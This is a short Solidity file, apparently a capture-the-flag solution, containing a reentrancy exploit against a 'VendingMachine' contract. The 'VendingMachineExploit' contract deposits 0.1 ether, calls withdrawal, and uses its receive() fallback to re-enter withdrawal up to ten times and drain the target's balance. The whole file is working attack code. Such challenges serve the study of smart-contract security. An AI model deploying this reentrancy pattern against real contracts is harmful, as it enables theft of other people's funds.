// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./VendingMachine.sol";

function playerScript(address instanceAddress) {
    new VendingMachineExploit().exploit{value: 0.1 ether}(instanceAddress);
}

contract VendingMachineExploit {
    uint256 i = 0;

    function exploit(address instanceAddress) public payable {
        VendingMachine instance = VendingMachine(instanceAddress);
        instance.deposit{value: 0.1 ether}();
        instance.withdrawal();
    }

    receive() external payable {
        if (i < 10) {
            i += 1;
            VendingMachine(msg.sender).withdrawal();
        }
    }
}
